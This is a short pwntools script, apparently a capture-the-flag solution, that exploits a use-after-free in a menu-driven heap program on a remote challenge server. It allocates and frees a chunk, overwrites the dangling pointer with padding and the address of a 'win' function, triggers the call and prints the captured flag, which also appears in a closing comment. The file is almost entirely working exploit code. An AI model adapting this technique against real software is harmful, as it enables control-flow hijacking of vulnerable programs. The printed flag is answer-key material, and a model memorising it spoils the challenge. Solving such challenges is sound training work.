from pwn import *
context.binary = elf = ELF('./vuln', checksec=False)

# p = process('./vuln')
p = remote('9.223.112.123', 60005)

win_addr = elf.symbols['win']

def alloc(idx):
    p.sendlineafter(b">>> ", b"1")
    p.sendlineafter(b"idx (0-4):", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b">>> ", b"2")
    p.sendlineafter(b"idx (0-4):", str(idx).encode())
    p.sendafter(b"data:", data)

def free(idx):
    p.sendlineafter(b">>> ", b"3")
    p.sendlineafter(b"idx (0-4):", str(idx).encode())

def call(idx):
    p.sendlineafter(b">>> ", b"4")
    p.sendlineafter(b"idx (0-4):", str(idx).encode())

alloc(0)
free(0)

payload = b'A' * 0x18 + p64(win_addr)
edit(0, payload)
call(0)

p.recvline()
flag = p.recvline().strip()
log.success(flag.decode())
p.close()

# flag{99b379bfc57379bf422fcbdabb313581}